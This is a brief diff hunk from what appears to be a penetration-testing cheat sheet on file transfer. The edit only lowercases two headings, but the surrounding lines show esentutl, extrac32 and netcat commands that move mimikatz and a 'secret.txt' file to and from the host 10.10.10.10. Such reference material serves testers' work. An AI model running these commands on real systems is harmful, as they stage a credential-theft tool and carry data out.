@@ -143,13 +143,13 @@ C:\Windows\System32\esentutl.exe /y "\\10.10.10.10\share\mimikatz_trunk.zip" /d"
 C:\Windows\System32\extrac32.exe /Y /C \\10.10.10.10\share\secret.txt C:\Users\Public\secret.txt
 ```
 
-## netcat file
+## netcat
 ```
 nc -nlvp 8000 > mimi_incoming.exe
 nc -nv 10.10.10.10 8000 </tmp/mimikatz.exe
 ```
 
-## Web Browser / Server
+## web browser / server
 ```
 python -m SimpleHTTPServer 80
 python3 -m http.server
